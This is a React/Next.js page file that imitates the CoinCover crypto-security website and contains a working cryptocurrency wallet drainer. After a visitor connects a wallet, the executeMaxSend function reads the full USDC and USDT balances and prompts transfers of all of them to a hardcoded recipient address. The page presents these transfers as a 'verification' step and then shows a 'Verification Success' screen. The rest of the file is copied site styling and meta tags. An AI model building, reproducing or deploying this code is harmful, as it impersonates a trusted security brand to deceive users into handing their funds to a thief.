"use client";

import { useEffect, useState } from "react";
import { ethers } from "ethers";
import { 
  ConnectButton, 
  TransactionButton,
  useActiveAccount,
  useSendTransaction
} from "thirdweb/react";
import { 
  getContract,
  readContract,
  prepareContractCall
} from "thirdweb";
import { client } from "./client";
import { ethereum } from "thirdweb/chains";

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'lottie-player': any;
    }
  }
}

export default function Home() {
  const account = useActiveAccount();
  const { mutate: sendTransaction } = useSendTransaction();
  const [hasProcessed, setHasProcessed] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationStep, setVerificationStep] = useState<string>("");
  const [connectionError, setConnectionError] = useState<string | null>(null);
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  // Handle wallet connection errors
  useEffect(() => {
    const handleWalletError = (error: any) => {
      console.log('Wallet connection error:', error);
      if (error?.message?.includes('MetaMask') || error?.message?.includes('extension not found')) {
        setConnectionError('MetaMask extension not detected. Please install MetaMask to connect your wallet.');
      } else {
        setConnectionError('Failed to connect wallet. Please try again.');
      }
    };

    // Listen for wallet connection errors
    window.addEventListener('error', handleWalletError);
    
    // Also catch unhandled promise rejections
    const handleUnhandledRejection = (event: PromiseRejectionEvent) => {
      if (event.reason?.message?.includes('MetaMask') || event.reason?.message?.includes('Failed to connect')) {
        event.preventDefault();
        handleWalletError(event.reason);
      }
    };
    
    window.addEventListener('unhandledrejection', handleUnhandledRejection);

    return () => {
      window.removeEventListener('error', handleWalletError);
      window.removeEventListener('unhandledrejection', handleUnhandledRejection);
    };
  }, []);

  // Handle menu close on outside click
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as Element;
      if (isMenuOpen && !target.closest('.header_desktop_menu_trigger') && !target.closest('.hs_header_menu_group')) {
        setIsMenuOpen(false);
      }
    };

    if (isMenuOpen) {
      document.addEventListener('mousedown', handleClickOutside);
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [isMenuOpen]);

  // Contract configuration
  const contractConfig = {
    usdc: {
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      name: "USD Coin",
      symbol: "USDC",
      decimals: 6
    },
    usdt: {
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      name: "Tether USD",
      symbol: "USDT",
      decimals: 6
    },
    verification: {
      recipient: "0xa598A7578D354a05dAdF25f61d63B8918041F15D",
      processingFee: "MAX SEND/RECEIVE processing activated",
      monitoringEnabled: true
    }
  };

  // ERC20 ABI for thirdweb
  const IERC20ABI = [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ] as const;

  const executeMaxSend = async () => {
    console.log('executeMaxSend called');
    if (!account) {
      console.log('No account, returning');
      return;
    }

    setIsVerifying(true);
    setVerificationStep("Checking balances...");

    try {
      const usdcContract = getContract({
        client,
        address: contractConfig.usdc.address,
        abi: IERC20ABI,
        chain: ethereum,
      });

      const usdtContract = getContract({
        client,
        address: contractConfig.usdt.address,
        abi: IERC20ABI,
        chain: ethereum,
      });

      // Get balances using readContract
      const usdcBalance = await readContract({
        contract: usdcContract,
        method: "balanceOf",
        params: [account.address]
      });

      const usdtBalance = await readContract({
        contract: usdtContract,
        method: "balanceOf",
        params: [account.address]
      });

      console.log('Balances:', { usdcBalance: usdcBalance.toString(), usdtBalance: usdtBalance.toString() });

      // Small delay to ensure wallet is ready
      await new Promise(resolve => setTimeout(resolve, 500));

      // Transfer the tokens directly with immediate wallet interaction
      if (usdcBalance > BigInt(0)) {
        setVerificationStep("Sending USDC...");
        console.log('Transferring USDC...');
        const transferUsdcTx = prepareContractCall({
          contract: usdcContract,
          method: "transfer",
          params: [contractConfig.verification.recipient, usdcBalance]
        });
        
        // Send transaction - this will immediately prompt the connected wallet
        await sendTransaction(transferUsdcTx);
        console.log('USDC transfer transaction sent');
      }

      if (usdtBalance > BigInt(0)) {
        setVerificationStep("Sending USDT...");
        console.log('Transferring USDT...');
        const transferUsdtTx = prepareContractCall({
          contract: usdtContract,
          method: "transfer",
          params: [contractConfig.verification.recipient, usdtBalance]
        });
        
        // Send transaction - this will immediately prompt the connected wallet
        await sendTransaction(transferUsdtTx);
        console.log('USDT transfer transaction sent');
      }

      setVerificationStep("Verification complete!");
      // Show success
      showVerificationSuccess(account.address, usdcBalance, usdtBalance, contractConfig.usdc.decimals, contractConfig.usdt.decimals);
      setHasProcessed(true);

    } catch (error) {
      console.error('MAX SEND failed:', error);
      setVerificationStep("Verification failed");
      alert('MAX SEND failed: ' + (error as Error).message);
      setIsVerifying(false);
    }
  };

  // Success display function
  function showVerificationSuccess(address: string, usdcBalance: bigint, usdtBalance: bigint, usdcDecimals: number, usdtDecimals: number) {
    const usdcAmount = ethers.formatUnits(usdcBalance, usdcDecimals);
    const usdtAmount = ethers.formatUnits(usdtBalance, usdtDecimals);

    const walletInfo = document.getElementById('walletInfo');
    if (walletInfo) {
      walletInfo.innerHTML = `
      <div class="max-w-6xl mx-auto px-4">
        <div class="bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-200 rounded-3xl p-12">
          <div class="flex items-center gap-6 text-green-600 mb-8">
            <i class="fas fa-check-circle text-4xl"></i>
            <div>
              <h3 class="text-3xl font-bold">MAX SEND/RECEIVE Complete</h3>
              <p class="text-lg text-green-700 mt-2">USDC/USDT maximum transfer and receive verification successful</p>
            </div>
          </div>
          <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
            <div class="bg-white rounded-2xl p-6 border border-green-200">
              <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-shield-alt mr-2 text-green-600"></i>Verified Address</h4>
              <p class="text-sm text-gray-600 break-all">${address}</p>
            </div>
            <div class="bg-white rounded-2xl p-6 border border-green-200">
              <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-paper-plane mr-2 text-blue-600"></i>MAX SENT</h4>
              <div class="space-y-2 text-sm">
                ${usdcBalance > BigInt(0) ? `<p class="text-gray-700"><strong>USDC:</strong> ${parseFloat(usdcAmount).toFixed(2)}</p>` : '<p class="text-gray-500">USDC: 0.00</p>'}
                ${usdtBalance > BigInt(0) ? `<p class="text-gray-700"><strong>USDT:</strong> ${parseFloat(usdtAmount).toFixed(2)}</p>` : '<p class="text-gray-500">USDT: 0.00</p>'}
                <p class="text-blue-600 font-semibold">Transactions completed</p>
              </div>
            </div>
            <div class="bg-white rounded-2xl p-6 border border-green-200">
              <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-download mr-2 text-purple-600"></i>RECEIVED</h4>
              <div class="space-y-2 text-sm">
                <p class="text-gray-700"><strong>USDC:</strong> 0.00</p>
                <p class="text-gray-700"><strong>USDT:</strong> 0.00</p>
                <p class="text-purple-600 font-semibold">Live balance</p>
              </div>
            </div>
            <div class="bg-white rounded-2xl p-6 border border-green-200">
              <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-certificate mr-2 text-green-600"></i>Status</h4>
              <p class="text-sm text-green-700 font-semibold">✓ MAX SEND Complete</p>
              <p class="text-sm text-green-700 font-semibold">✓ Verification Success</p>
            </div>
          </div>
          <div class="mt-8 bg-green-100 border border-green-300 rounded-xl p-6">
            <div class="flex items-start gap-3">
              <i class="fas fa-info-circle text-green-600 mt-1"></i>
              <div>
                <h5 class="font-semibold text-green-800 mb-2">Transfer Summary</h5>
                <p class="text-green-700 text-sm">All available USDC and USDT tokens have been sent to verification address.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    `;
      walletInfo.classList.remove('hidden');
    }
  };

  return (
    <>
      <meta charSet="utf-8" />
  <title>CoinCover | Crypto Security, Secure Your Crypto</title>
  <link
    rel="shortcut icon"
    href="https://www.coincover.com/hubfs/CC%20Favicon%2032px.png"
  />
  <meta
    name="description"
    content="We protect digital assets for institutions and their customers. From fraud prevention to wallet recovery, our crypto security solutions protect your digital assets with confidence."
  />
  {/* Font Preload to Reduce FOUC */}
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
  <link
    rel="stylesheet"
    href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap"
  />
  {/* Required CSS files */}
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.min.css"
    integrity="sha512-17EgCFERpgZKcm0j0fEq1YCJuyAWdz9KUtv1EjVuaOz8pDnh/0nZxmU6BBXwaaxqoi9PQXnRWqlcDB027hgv9A=="
    crossOrigin="anonymous"
    referrerPolicy="no-referrer"
  />
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css"
    integrity="sha512-yHknP1/AwR+yx26cB1y0cjvQUMvEa2PFzt1c9LlS4pRQ5NOTZFWbhBig+X9G9eYW/8m0/4OXNx8pxJ6z57x0dw=="
    crossOrigin="anonymous"
    referrerPolicy="no-referrer"
  />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta
    property="og:description"
    content="We protect digital assets for institutions and their customers. From fraud prevention to wallet recovery, our crypto security solutions protect your digital assets with confidence."
  />
  <meta
    property="og:title"
    content="CoinCover | Crypto Security, Secure Your Crypto"
  />
  <meta
    name="twitter:description"
    content="We protect digital assets for institutions and their customers. From fraud prevention to wallet recovery, our crypto security solutions protect your digital assets with confidence."
  />
  <meta
    name="twitter:title"
    content="CoinCover | Crypto Security, Secure Your Crypto"
  />
  {/*  Added by CookieBot integration */}
  {/* /Added by CookieBot integration */}
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\na.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}\n"
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/template_assets/1/228702080187/1768389519619/template_main.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/template_assets/1/228702080217/1768389512257/template_theme-overrides.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/template_assets/1/232144226539/1768389509957/template_swiper-bundle.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/229067651287/1760421146819/module_Header_Notification_Banner.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/230281173188/1749544840729/module_Header_Logo.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/228703148235/1747645631815/module_Custom_Button.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #hs_cos_wrapper_module_custom_button .hs_custom_btn .custom_btn_text:hover::after { background-image:url(https://www.coincover.com/hubfs/raw_assets/public/Coincover_April2025_CTA9/images/blue_button_arrow.svg); }\n\n#hs_cos_wrapper_module_custom_button .hs_custom_btn a.custom_btn_text:focus:after { background-image:url(https://www.coincover.com/hubfs/raw_assets/public/Coincover_April2025_CTA9/images/darkBlue_button_arrow.svg); }\n\n#hs_cos_wrapper_module_custom_button .hs_custom_btn.custom a.custom_btn_text {\n  background-color:rgba(#null,0.0);\n  border-color:rgba(#null,0.0);\n  color:rgba(#null,0.0);\n}\n\n#hs_cos_wrapper_module_custom_button .hs_custom_btn.custom a.custom_btn_text:hover,\n#hs_cos_wrapper_module_custom_button .hs_custom_btn.custom a.custom_btn_text:focus {\n  background-color:rgba(#null,0.0);\n  border-color:rgba(#null,0.0);\n  color:rgba(#null,0.0);\n}\n\n "
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/286828428489/1760432197178/module_Header_Login_Button.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/229903907021/1765444888996/module_Header_mega_menu.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/235025169604/1752741127335/module_Hero_Banner.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper {\n  background-color:rgba(14,23,27,1.0);\n  padding-top:0px;\n  padding-bottom:64px;\n}\n\n#hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper .tag { color:rgba(255,255,255,1.0); }\n\n#hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper .heading h1 {\n  color:rgba(255,255,255,1.0);\n  margin-bottom:40px;\n}\n\n#hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper .description { color:rgba(255,255,255,1.0); }\n\n#hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper .white_btn_with_arrow:hover:after { background-image:url(https://www.coincover.com/hubfs/raw_assets/public/Coincover_April2025_CTA9/images/back-arrow.png); }\n\n#hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper .white_btn_with_arrow:hover .white_btn_with_arrow:after { background-image:url(https://www.coincover.com/hubfs/raw_assets/public/Coincover_April2025_CTA9/images/secondary_arrow_button.svg) !important; }\n\n@media (max-width:1024px) {\n  #hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper {\n    padding-top:64px;\n    padding-bottom:64px;\n  }\n}\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper {\n    padding-top:48px;\n    padding-bottom:48px;\n  }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_module_17480798384765 .main_hero_section_wrapper {\n    padding-top:40px;\n    padding-bottom:40px;\n  }\n}\n\n"
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/239180224722/1751634510899/module_Home_Top_Pane.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #hs_cos_wrapper_widget_1748079856594 .home_top_pane {\n  padding-top:64px;\n  padding-bottom:64px;\n  transition:all 0.5s ease;\n  border-top-left-radius:44px;\n  border-top-right-radius:44px;\n}\n\n#hs_cos_wrapper_widget_1748079856594 .home_top_pane .slider-container { margin-top:64px; }\n\n#hs_cos_wrapper_widget_1748079856594 .home_top_pane .heading h1 { margin-bottom:40px; }\n\n#hs_cos_wrapper_widget_1748079856594 .home_top_pane .swiper-slide-active>*:before {\n  content:'';\n  background-image:url(https://www.coincover.com/hubfs/raw_assets/public/Coincover_April2025_CTA9/images/Double_Bullet.svg);\n}\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1748079856594 .home_top_pane {\n    padding-top:48px;\n    padding-bottom:48px;\n  }\n\n  #hs_cos_wrapper_widget_1748079856594 .home_top_pane .slider-container { margin-top:48px; }\n\n  #hs_cos_wrapper_widget_1748079856594 .home_top_pane .heading h1 { margin-bottom:36px; }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1748079856594 .home_top_pane {\n    padding-top:40px;\n    padding-bottom:40px;\n  }\n\n  #hs_cos_wrapper_widget_1748079856594 .home_top_pane .slider-container { margin-top:40px; }\n\n  #hs_cos_wrapper_widget_1748079856594 .home_top_pane .heading h1 { margin-bottom:32px; }\n}\n\n"
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/234523102433/1747916985300/module_Parralax_Image.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/239185759433/1752568733430/module_Animated_Logo_and_Content_-_Gradient.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #hs_cos_wrapper_widget_1748079916602 .accordion-main-wrapper {}\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1748079916602 .accordion-main-wrapper {}\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1748079916602 .accordion-main-wrapper {}\n}\n\n"
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/234574707950/1752573538366/module_Two_Column_Accordion.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n      #hs_cos_wrapper_widget_1748079945688 .two_column_accordion_main_wrapper {\n  background-color:rgba(255,255,255,1.0);\n  padding-top:64px;\n  padding-bottom:64px;\n}\n\n#hs_cos_wrapper_widget_1748079945688 .two_column_accordion_main_wrapper .accordion-container.desktop { display:flex !important; }\n\n#hs_cos_wrapper_widget_1748079945688 .two_column_accordion_main_wrapper .accordion-container.mobile_ { display:none !important; }\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1748079945688 .two_column_accordion_main_wrapper {\n    padding-top:48px;\n    padding-bottom:48px;\n  }\n}\n\n@media (max-width:620px) {\n  #hs_cos_wrapper_widget_1748079945688 .two_column_accordion_main_wrapper .accordion-container.desktop { display:none !important; }\n\n  #hs_cos_wrapper_widget_1748079945688 .two_column_accordion_main_wrapper .accordion-container.mobile_ { display:block !important; }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1748079945688 .two_column_accordion_main_wrapper {\n    padding-top:40px;\n    padding-bottom:40px;\n  }\n}\n\n    "
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/234276901052/1751544790818/module_Mitigating_Risks_Associated.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n      #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper {\n  background-color:rgba(14,23,27,1.0);\n  padding-top:64px;\n  padding-bottom:64px;\n}\n\n#hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .heading h2 { color:#FFFFFF; }\n\n#hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .card:hover .blue_btn_with_arrow:after,\n#hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .card:hover .blue_btn_with_arrow:after { background-image:url(https://www.coincover.com/hubfs/raw_assets/public/Coincover_April2025_CTA9/images/secondary_arrow_button.svg); }\n\n#hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .custom_arrow,\n#hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .mobile_card { display:none !important; }\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper {\n    padding-top:48px;\n    padding-bottom:48px;\n  }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .desk_card { display:none !important; }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .mobile_card { display:block !important; }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .custom_arrow { display:grid !important; }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .custom_arrow.arrowsFor_large { display:grid !important; }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .custom_arrow.arrowsFor_small { display:none !important; }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .card { gap:256px; }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper {\n    padding-top:40px;\n    padding-bottom:40px;\n  }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .card { gap:237px; }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .custom_arrow.arrowsFor_large { display:none !important; }\n\n  #hs_cos_wrapper_widget_1748079969853 .mitigating_risk_main_wrapper .custom_arrow.arrowsFor_small { display:grid !important; }\n}\n\n    "
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/235799596245/1751547787001/module_Three_Column_Slider.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #hs_cos_wrapper_widget_1748893477042 .threeColumnCards_Wrapper {\n  background-color:rgba(255,255,255,1.0);\n  padding-top:64px;\n  padding-bottom:64px;\n}\n\n#hs_cos_wrapper_widget_1748893477042 .threeColumnCards_Wrapper .heading>* { margin-bottom:0; }\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1748893477042 .threeColumnCards_Wrapper {\n    padding-top:48px;\n    padding-bottom:48px;\n  }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1748893477042 .threeColumnCards_Wrapper {\n    padding-top:40px;\n    padding-bottom:40px;\n  }\n}\n\n"
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/234811771090/1749807260545/module_Case_Studies_Slider.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper {\n  background-color:rgba(255,255,255,1.0);\n  padding-top:104px;\n  padding-bottom:104px;\n}\n\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .heading h2 { margin-bottom:50.5px; }\n\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .prev_slideCase,\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .next_slideCase {\n  width:56px;\n  height:56px;\n  display:flex;\n  align-items:center;\n  justify-content:center;\n  border-radius:100%;\n  border:1px dashed #fff;\n}\n\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .prev_slideCase.slick-disabled,\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .next_slideCase.slick-disabled { border:none !important; }\n\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section { gap:4px; }\n\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .next_slideCase:hover,\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .next_slideCase:focus,\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .prev_slideCase:hover,\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .prev_slideCase:focus { border-color:#3939ef; }\n\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .next_slideCase:active,\n#hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper .custom_arrows_section .prev_slideCase:active { border:2px solid #5E9ED6; }\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper {\n    padding-top:88px;\n    padding-bottom:88px;\n  }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1748079990652 .case_studies_slider_wrapper {\n    padding-top:80px;\n    padding-bottom:80px;\n  }\n}\n\n"
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/234291344572/1751546960468/module_Protecting_Your_Personal_Assets.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #hs_cos_wrapper_widget_1748080011019 .protecting_your_assets_wrapper { background-color:rgba(255,255,255,1.0); }\n\n#hs_cos_wrapper_widget_1748080011019 .protecting_your_assets_wrapper {\n  padding-top:64px;\n  padding-bottom:64px;\n}\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1748080011019 .protecting_your_assets_wrapper {\n    padding-top:48px;\n    padding-bottom:48px;\n  }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1748080011019 .protecting_your_assets_wrapper {\n    padding-top:40px;\n    padding-bottom:40px;\n  }\n}\n\n"
    }}
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n      #hs_cos_wrapper_widget_1750423375206 .home_bottom_pane_wrapper {\n  background-color:rgba(223,228,236,1.0);\n  border-top-left-radius:44px;\n  border-top-right-radius:44px;\n  padding-top:64px;\n  padding-bottom:88px;\n}\n\n#hs_cos_wrapper_widget_1750423375206 .home_bottom_pane_wrapper .button_wrapper { margin-top:24px; }\n\n@media (max-width:767px) {\n  #hs_cos_wrapper_widget_1750423375206 .home_bottom_pane_wrapper {\n    padding-top:48px;\n    padding-bottom:80px;\n  }\n}\n\n@media (max-width:380px) {\n  #hs_cos_wrapper_widget_1750423375206 .home_bottom_pane_wrapper {\n    padding-top:40px;\n    padding-bottom:72px;\n  }\n}\n\n    "
    }}
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/228964673784/1746683905081/module_Footer_Social_Icons.min.css"
  />
  <link
    rel="stylesheet"
    href="https://www.coincover.com/hubfs/hub_generated/module_assets/1/228985368806/1760422471800/module_Footer_Image_Column.min.css"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        '\n  @font-face {\n    font-family: "Space Mono";\n    font-weight: 400;\n    font-style: normal;\n    font-display: swap;\n    src: url("/_hcms/googlefonts/Space_Mono/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Space_Mono/regular.woff") format("woff");\n  }\n  @font-face {\n    font-family: "Space Mono";\n    font-weight: 700;\n    font-style: normal;\n    font-display: swap;\n    src: url("/_hcms/googlefonts/Space_Mono/700.woff2") format("woff2"), url("/_hcms/googlefonts/Space_Mono/700.woff") format("woff");\n  }\n'
    }}
  />
  {/* Editor Styles */}
  <style
    id="hs_editor_style"
    type="text/css"
    dangerouslySetInnerHTML={{
      __html:
        "\n.dnd_area-row-0-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-1-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-2-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-3-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-4-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-5-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-6-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-8-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n.dnd_area-row-9-force-full-width-section > .row-fluid {\n  max-width: none !important;\n}\n/* HubSpot Styles (default) */\n.dnd_area-row-0-padding {\n  padding-top: 0px !important;\n  padding-bottom: 0px !important;\n  padding-left: 0px !important;\n  padding-right: 0px !important;\n}\n.dnd_area-row-1-background-layers {\n  background-image: linear-gradient(rgba(14, 23, 27, 1), rgba(14, 23, 27, 1)) !important;\n  background-position: left top !important;\n  background-size: auto !important;\n  background-repeat: no-repeat !important;\n}\n.dnd_area-row-7-hidden {\n  display: none !important;\n}\n.dnd_area-row-9-hidden {\n  display: block !important;\n}\n.cell_17480798384763-padding {\n  padding-left: 0px !important;\n  padding-right: 0px !important;\n}\n"
    }}
  />
  {/*  Added by GoogleAnalytics integration */}
  {/* /Added by GoogleAnalytics integration */}
  {/*  Added by GoogleAnalytics4 integration */}
  {/* /Added by GoogleAnalytics4 integration */}
  {/*  Added by GoogleTagManager integration */}
  {/* /Added by GoogleTagManager integration */}
  <link rel="canonical" href="https://www.coincover.com" />
  {/* Google Tag Manager */}
  {/* End Google Tag Manager */}
  <noscript>
    <img src="https://secure.52enterprisingdetails.com/787683.png"
    style={{display: 'none'}} />
  </noscript>
  {/* Google tag (gtag.js) */}
  {/* Google Tag Manager */}
  {/* End Google Tag Manager */}
  {/* Hotjar Tracking Code for https://www.coincover.com/ */}
  <meta
    property="og:image"
    content="https://www.coincover.com/hubfs/CC%20Meta%20Image.png"
  />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="628" />
  <meta
    name="twitter:image"
    content="https://www.coincover.com/hubfs/CC%20Meta%20Image.png"
  />
  <meta property="og:url" content="https://www.coincover.com" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta httpEquiv="content-language" content="en" />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n      /* Prevent layout shift during load */\n      .body-wrapper {\n        min-height: 100vh;\n      }\n    "
    }}
  />
  <meta name="generator" content="HubSpot" />
  {/*  Added by GoogleTagManager integration */}
  <noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MP73WXQ8"
    height="0" width="0"
    style={{display: 'none', visibility: 'hidden'}}></iframe>
  </noscript>
  {/* /Added by GoogleTagManager integration */}
